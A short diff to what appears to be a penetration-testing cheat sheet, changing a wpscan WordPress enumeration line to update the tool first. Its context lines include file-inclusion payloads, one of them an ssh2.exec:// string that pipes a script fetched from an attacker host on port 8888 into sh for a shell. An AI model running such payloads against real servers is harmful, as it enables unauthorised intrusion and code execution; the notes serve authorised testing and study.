@@ -304,7 +304,7 @@ index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource
 index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:8888/resh|sh;
 
 [*] WordPress
-wpscan --url http://$TARGET/wordpress --enumerate
+wpscan --update > /dev/null; wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 [*] Joomla
